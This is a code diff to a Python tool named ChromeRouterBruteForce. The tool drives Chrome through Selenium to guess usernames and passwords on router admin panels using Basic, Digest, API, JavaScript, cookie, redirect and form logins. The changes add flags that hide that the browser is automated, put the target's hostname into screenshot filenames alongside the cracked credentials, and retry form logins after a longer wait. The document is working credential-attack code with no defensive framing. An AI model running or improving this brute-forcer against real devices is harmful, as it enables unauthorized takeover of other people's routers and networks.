@@ -202,9 +202,21 @@ class ChromeRouterBruteForce:
             chrome_options.add_argument('--ignore-ssl-errors')
             chrome_options.add_argument('--ignore-certificate-errors-spki-list')
             chrome_options.add_argument('--ignore-certificate-errors-spki-list')
+            chrome_options.add_argument('--disable-features=VizDisplayCompositor')
+            chrome_options.add_argument('--disable-background-networking')
+            chrome_options.add_argument('--disable-background-timer-throttling')
+            chrome_options.add_argument('--disable-renderer-backgrounding')
+            chrome_options.add_argument('--disable-backgrounding-occluded-windows')
             chrome_options.add_argument('--disable-blink-features=AutomationControlled')
             chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
             chrome_options.add_experimental_option('useAutomationExtension', False)
+            
+            # SSL and certificate handling
+            chrome_options.add_experimental_option("prefs", {
+                "profile.default_content_setting_values.notifications": 2,
+                "profile.default_content_settings.popups": 0,
+                "profile.managed_default_content_settings.images": 2
+            })
             
             # Window size
             chrome_options.add_argument('--window-size=1920,1080')
@@ -503,11 +515,23 @@ class ChromeRouterBruteForce:
             print(f"{Colors.YELLOW}[!] Error checking login success: {e}{Colors.END}")
             return False, f"Error: {e}"
     
-    def take_screenshot(self, filename_prefix="login_attempt"):
+    def take_screenshot(self, filename_prefix="login_attempt", url=None):
         """Take screenshot and save it"""
         try:
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-            filename = f"{filename_prefix}_{timestamp}.png"
+            
+            # Extract IP from URL if provided
+            ip_part = ""
+            if url:
+                try:
+                    from urllib.parse import urlparse
+                    parsed_url = urlparse(url)
+                    if parsed_url.hostname:
+                        ip_part = f"_{parsed_url.hostname}"
+                except:
+                    pass
+            
+            filename = f"{filename_prefix}{ip_part}_{timestamp}.png"
             filepath = os.path.join(self.screenshot_dir, filename)
             
             self.driver.save_screenshot(filepath)
@@ -751,7 +775,7 @@ class ChromeRouterBruteForce:
                     print(f"{Colors.BLUE}[*] Admin panel details: {reason}{Colors.END}")
                     # Wait a bit more for admin panel to fully load
                     time.sleep(3)
-                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                     return True, screenshot_path
                 else:
                     print(f"{Colors.YELLOW}[!] Basic Auth worked but not admin panel: {reason}{Colors.END}")
@@ -779,7 +803,7 @@ class ChromeRouterBruteForce:
                 # Navigate to the authenticated URL with Selenium
                 self.driver.get(login_url)
                 time.sleep(3)
-                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                 return True, screenshot_path
             else:
                 print(f"{Colors.YELLOW}[-] HTTP Digest Auth failed: Status {response.status_code}{Colors.END}")
@@ -846,7 +870,7 @@ class ChromeRouterBruteForce:
                     api_success = self.driver.execute_script("return window.apiSuccess;")
                     if api_success:
                         print(f"{Colors.GREEN}[+] API-based Auth successful! {username}:{password}{Colors.END}")
-                        screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                        screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                         return True, screenshot_path
                         
                 except Exception as e:
@@ -939,7 +963,7 @@ class ChromeRouterBruteForce:
                 success, reason = self.is_admin_panel_loaded()
                 if success:
                     print(f"{Colors.GREEN}[+] JavaScript-based Auth successful! {username}:{password}{Colors.END}")
-                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                     return True, screenshot_path
                 
                 # Check if URL changed (might indicate success)
@@ -950,7 +974,7 @@ class ChromeRouterBruteForce:
                     success, reason = self.is_admin_panel_loaded()
                     if success:
                         print(f"{Colors.GREEN}[+] JavaScript-based Auth successful! {username}:{password}{Colors.END}")
-                        screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                        screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                         return True, screenshot_path
                 
             except Exception as e:
@@ -1000,7 +1024,7 @@ class ChromeRouterBruteForce:
             success, reason = self.is_admin_panel_loaded()
             if success:
                 print(f"{Colors.GREEN}[+] Cookie-based Auth successful! {username}:{password}{Colors.END}")
-                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                 return True, screenshot_path
             
             return False, "Cookie-based Auth failed"
@@ -1047,7 +1071,7 @@ class ChromeRouterBruteForce:
                 success, reason = self.is_admin_panel_loaded()
                 if success:
                     print(f"{Colors.GREEN}[+] Redirect-based Auth successful! {username}:{password}{Colors.END}")
-                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                     return True, screenshot_path
             
             return False, "Redirect-based Auth failed"
@@ -1094,8 +1118,20 @@ class ChromeRouterBruteForce:
             success, reason = self.is_admin_panel_loaded()
             if success:
                 print(f"{Colors.GREEN}[+] Form-based Auth successful! {username}:{password}{Colors.END}")
-                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                 return True, screenshot_path
+            
+            # If page title is empty, wait longer and try again
+            if not self.driver.title or self.driver.title.strip() == "":
+                print(f"{Colors.YELLOW}[!] Empty page title, waiting longer for page load...{Colors.END}")
+                time.sleep(10)  # Wait longer for page to load
+                
+                # Check again after waiting
+                success, reason = self.is_admin_panel_loaded()
+                if success:
+                    print(f"{Colors.GREEN}[+] Form-based Auth successful after wait! {username}:{password}{Colors.END}")
+                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
+                    return True, screenshot_path
             
             return False, "Form-based Auth failed"
             
